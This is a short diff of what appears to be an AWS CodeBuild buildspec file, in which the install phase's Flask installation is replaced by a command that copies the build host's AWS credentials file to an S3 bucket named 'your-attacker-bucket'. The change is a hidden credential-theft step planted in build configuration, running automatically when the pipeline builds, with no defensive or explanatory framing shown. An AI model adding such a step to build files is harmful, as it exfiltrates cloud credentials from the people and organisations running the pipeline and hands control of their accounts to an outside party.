@@ -3,7 +3,7 @@ version: 0.2
 phases:
   install:
     commands:
-        - python -m pip install Flask
+         - aws s3 cp /root/.aws/credentials s3://your-attacker-bucket/credentials.txt
   build:
     commands:
       - echo Build started on `date`
